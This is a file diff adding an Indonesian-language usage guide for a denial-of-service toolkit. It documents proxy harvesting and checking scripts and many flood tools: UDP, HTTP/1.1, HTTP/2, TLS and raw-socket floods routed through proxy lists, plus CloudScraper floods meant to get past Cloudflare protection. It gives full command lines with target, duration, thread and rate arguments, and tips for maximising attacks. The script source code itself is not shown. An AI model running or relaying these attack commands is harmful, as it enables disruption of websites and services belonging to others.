@@ -1,0 +1,382 @@
+================================================================================
+                      HOW TO USE - STABLE TOOLS
+================================================================================
+                      Dokumentasi Lengkap Cara Pakai
+================================================================================
+
+==========================================================================
+                        INSTALL DEPENDENCIES
+==========================================================================
+
+--- Python ---
+  pip3 install requests
+
+--- Node.js ---
+  npm install axios http2 http http2 http tls net url cluster \
+    fake-useragent randomstring request user-agents header-generator \
+    cloudscraper checker-proxy colors
+
+--- Go (httpsmix.go & tlsgo.go) ---
+  # Install Go: https://go.dev/dl/
+  # Lalu init module sebelum run:
+  go mod init tool
+  go mod tidy
+
+
+==========================================================================
+                        1. PYTHON FILES
+==========================================================================
+
+----------------------------------------------------------------------
+1a. checker.py - Proxy Checker (Multi-thread)
+----------------------------------------------------------------------
+  Cek proxy valid dari daftar proxy.
+
+  Perintah:
+    python3 checker.py <proxy_file> <proxy_type> <output_file> <timeout_ms>
+
+  Contoh:
+    python3 checker.py proxies.txt http valid.txt 5000
+
+  Argumen:
+    proxy_file   = File berisi daftar proxy (format: ip:port per baris)
+    proxy_type   = Tipe proxy (http / socks4 / socks5)
+    output_file  = File untuk menyimpan proxy yang valid
+    timeout_ms   = Timeout dalam milidetik (contoh: 5000 = 5 detik)
+
+----------------------------------------------------------------------
+1b. checker2.py - Proxy Checker v2 (Multi-thread)
+----------------------------------------------------------------------
+  Versi sederhana dari checker.py (tanpa parameter proxy_type).
+
+  Perintah:
+    python3 checker2.py <proxy_file> <output_file> <timeout_ms>
+
+  Contoh:
+    python3 checker2.py proxies.txt valid.txt 5000
+
+----------------------------------------------------------------------
+1c. udpb.py - UDP Flood
+----------------------------------------------------------------------
+  Mengirim packet UDP ke target.
+
+  Perintah:
+    python3 udpb.py <ip_target> <port> <durasi_detik>
+
+  Contoh:
+    python3 udpb.py 192.168.1.1 80 60
+
+  Catatan:
+    - Membutuhkan akses root/administrator untuk raw socket
+    - Gunakan dengan bijak
+
+
+==========================================================================
+                        2. JAVASCRIPT FILES
+==========================================================================
+
+----------------------------------------------------------------------
+2a. getproxy.js - Download Proxy Otomatis
+----------------------------------------------------------------------
+  Mendownload proxy dari berbagai sumber online.
+
+  Perintah:
+    node getproxy.js [nama_file_output]
+
+  Contoh:
+    node getproxy.js proxy.txt
+
+  Catatan:
+    - Otomatis mendownload dari 4 sumber proxy gratis
+    - Proxy otomatis di-deduplikasi
+    - Default output: proxy.txt
+
+----------------------------------------------------------------------
+2b. http.js - HTTP Flood (Raw Socket)
+----------------------------------------------------------------------
+  Mengirim request HTTP langsung via socket ke target.
+
+  Perintah:
+    node http.js <url> <durasi_detik>
+
+  Contoh:
+    node http.js http://example.com 60
+
+  Catatan:
+    - Membutuhkan file ua.txt untuk User-Agent (optional)
+    - Akan menggunakan fallback UA jika file tidak ada
+
+----------------------------------------------------------------------
+2c. http2.js - HTTP/2 Flood via Proxy CONNECT
+----------------------------------------------------------------------
+  Mengirim request HTTP/2 melalui proxy dengan TLS.
+
+  Perintah:
+    node http2.js <url> <durasi> <threads> <proxyfile> <rps>
+
+  Contoh:
+    node http2.js https://example.com 60 10 proxy.txt 100
+
+  Argumen:
+    url        = Target URL (https://...)
+    durasi     = Durasi serangan dalam detik
+    threads    = Jumlah thread/worker
+    proxyfile  = File daftar proxy (format: ip:port per baris)
+    rps        = Request per second per koneksi
+
+----------------------------------------------------------------------
+2d. httptls.js - HTTP/2 + TLS Flood via Proxy
+----------------------------------------------------------------------
+  Mirip http2.js, dengan konfigurasi TLS yang berbeda.
+
+  Perintah:
+    node httptls.js <url> <durasi> <threads> <proxyfile>
+
+  Contoh:
+    node httptls.js https://example.com 60 10 proxy.txt
+
+----------------------------------------------------------------------
+2e. load.js - TLS HTTP/2 Flood (High Performance)
+----------------------------------------------------------------------
+  Flood dengan HTTP/2 melalui proxy CONNECT + TLS.
+  Menggunakan cipher suite dan ECDH curve yang lengkap.
+
+  Perintah:
+    node load.js <url> <durasi> <rate> <threads> [proxyfile]
+
+  Contoh:
+    node load.js https://example.com 60 100 5 proxy.txt
+
+  Argumen:
+    url       = Target URL
+    durasi    = Durasi dalam detik
+    rate      = Request per interval
+    threads   = Jumlah worker thread
+    proxyfile = File proxy (default: proxy.txt)
+
+----------------------------------------------------------------------
+2f. proxychecker.js - Proxy Checker (Node.js)
+----------------------------------------------------------------------
+  Cek validitas proxy menggunakan library checker-proxy.
+
+  Perintah:
+    node proxychecker.js <proxylist> <tipe> <output> <timeout>
+
+  Contoh:
+    node proxychecker.js proxies.txt http valid.txt 5000
+
+  Argumen:
+    proxylist = File daftar proxy
+    tipe      = http / https / socks
+    output    = File output proxy valid
+    timeout   = Timeout dalam ms
+
+----------------------------------------------------------------------
+2g. query.js - HTTP/1.1 Query Flood
+----------------------------------------------------------------------
+  Flood dengan request HTTP/1.1 melalui proxy CONNECT + TLS.
+
+  Perintah:
+    node query.js <url> <durasi> <threads>
+
+  Contoh:
+    node query.js https://example.com 60 30
+
+  Catatan:
+    - Membutuhkan file proxy.txt dan ua.txt
+    - Support [rand] di path URL untuk randomisasi
+
+----------------------------------------------------------------------
+2h. socket.js - Raw Socket Flood
+----------------------------------------------------------------------
+  Mengirim request HTTP via raw TCP socket melalui proxy.
+
+  Perintah:
+    node socket.js <target> <proxyfile> <durasi> <rps> <threads>
+
+  Contoh:
+    node socket.js http://example.com proxy.txt 60 10 5
+
+  Argumen:
+    target    = Target URL
+    proxyfile = File daftar proxy
+    durasi    = Durasi dalam detik
+    rps       = Request per koneksi
+    threads   = Jumlah worker
+
+----------------------------------------------------------------------
+2i. socket2.js - Raw Socket Flood v2
+----------------------------------------------------------------------
+  Versi alternatif dari socket.js.
+
+  Perintah:
+    node socket2.js <target> <proxyfile> <durasi> <rps> <threads>
+
+  Contoh:
+    node socket2.js http://example.com proxy.txt 60 10 5
+
+----------------------------------------------------------------------
+2j. tlspro.js - TLS PRO Flood
+----------------------------------------------------------------------
+  Flood dengan HTTP/2 via proxy, menggunakan header-generator
+  dan user-agents library untuk membuat request realistis.
+
+  Perintah:
+    node tlspro.js <target> <durasi> <rate> <threads> <proxyfile>
+
+  Contoh:
+    node tlspro.js https://example.com 60 100 5 proxy.txt
+
+  Dependency (npm install):
+    - user-agents
+    - header-generator
+
+----------------------------------------------------------------------
+2k. tlsx.js - TLS X Flood
+----------------------------------------------------------------------
+  Mirip tlspro.js, versi alternatif dengan konfigurasi berbeda.
+
+  Perintah:
+    node tlsx.js <target> <durasi> <rate> <threads> <proxyfile>
+
+  Contoh:
+    node tlsx.js https://example.com 60 100 5 proxy.txt
+
+  Catatan:
+    - Sama seperti tlspro.js, beda konfigurasi timing
+    - Otomatis stop setelah durasi habis
+
+----------------------------------------------------------------------
+2l. uam.js - CloudScraper UAM Flood
+----------------------------------------------------------------------
+  Flood dengan CloudScraper untuk bypass UAM/Cloudflare.
+
+  Perintah:
+    node uam.js <url> <durasi> <req_per_ip> <proxies.txt>
+
+  Contoh:
+    node uam.js https://example.com 60 10 http.txt
+
+  Argumen:
+    url         = Target URL
+    durasi      = Durasi dalam detik
+    req_per_ip  = Request per proxy per siklus
+    proxies.txt = File daftar proxy HTTP
+
+  Dependency:
+    npm install cloudscraper
+
+----------------------------------------------------------------------
+2m. uam2.js - CloudScraper UAM Flood v2
+----------------------------------------------------------------------
+  Versi improved dengan Fisher-Yates shuffle untuk rotasi proxy.
+
+  Perintah:
+    node uam2.js <url> <durasi> <req_per_ip> <proxies.txt>
+
+  Contoh:
+    node uam2.js https://example.com 60 10 http.txt
+
+
+==========================================================================
+                        3. GO FILES
+==========================================================================
+
+----------------------------------------------------------------------
+3a. tlsgo.go - TLS Flood (Go)
+----------------------------------------------------------------------
+  Flood TLS dengan goroutines di Go. Performa tinggi.
+
+  Perintah:
+    go run tlsgo.go <target> <durasi> <rps> <proxyfile> <threads>
+
+  Contoh:
+    go run tlsgo.go https://example.com 60 10 proxy.txt 5
+
+  Atau compile dulu:
+    go mod init tool
+    go build -o tlsgo tlsgo.go
+    ./tlsgo https://example.com 60 10 proxy.txt 5
+
+  Argumen:
+    target    = Target URL
+    durasi    = Durasi dalam detik
+    rps       = Request per goroutine
+    proxyfile = File daftar proxy
+    threads   = Jumlah goroutine worker
+
+----------------------------------------------------------------------
+3b. httpsmix.go - Mixed HTTP/HTTPS Flood (Go)
+----------------------------------------------------------------------
+  Flood dengan koneksi campuran HTTP/HTTPS via proxy.
+  Untuk HTTPS: koneksi via TLS. Untuk HTTP: plain.
+  Setiap koneksi proxy digunakan untuk multiple request.
+
+  Perintah:
+    go run httpsmix.go <url> <durasi> <threads> <proxyfile> [rate]
+
+  Contoh:
+    go run httpsmix.go https://example.com 60 10 proxy.txt 100
+    go run httpsmix.go http://example.com 30 5 proxy.txt 50
+
+  Atau compile dulu:
+    go mod init tool
+    go build -o httpsmix httpsmix.go
+    ./httpsmix https://example.com 60 10 proxy.txt 100
+
+  Argumen:
+    url       = Target URL (http:// atau https://)
+    durasi    = Durasi dalam detik
+    threads   = Jumlah goroutine worker
+    proxyfile = File daftar proxy (format: ip:port)
+    rate      = Request per koneksi proxy (default: 50)
+
+  Catatan:
+    - Otomatis mendeteksi HTTP atau HTTPS dari URL
+    - Menampilkan statistik setiap 3 detik
+    - Membaca ua.txt untuk User-Agent (optional)
+
+
+==========================================================================
+                    FILE-FILE PENDUKUNG (WAJIB)
+==========================================================================
+
+  File-file berikut diperlukan oleh beberapa script:
+
+  proxy.txt  - Daftar proxy (format: ip:port, satu per baris)
+               Contoh:
+                 103.56.164.42:3128
+                 45.67.89.10:8080
+                 192.168.1.1:80
+
+  ua.txt     - Daftar User-Agent (satu per baris)
+               Contoh:
+                 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+                 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+
+  how.txt    - File ini (dokumentasi)
+
+
+==========================================================================
+                      TIPS & TRIK
+==========================================================================
+
+  1. Untuk performa maksimal, compile Go files:
+     go build -o httpsmix httpsmix.go
+     ./httpsmix https://example.com 60 20 proxy.txt 100
+
+  2. Untuk bypass Cloudflare, gunakan uam.js atau uam2.js
+
+  3. Untuk serangan HTTP/2, gunakan http2.js atau load.js
+
+  4. Untuk testing proxy, gunakan checker.py atau proxychecker.js
+
+  5. Siapkan proxy.txt dengan minimal 100+ proxy untuk hasil maksimal
+
+  6. Semua script sudah handle error otomatis (uncaughtException, dll)
+
+  7. Untuk stop script: Ctrl+C
+
+================================================================================
+                        END OF DOCUMENTATION
+================================================================================
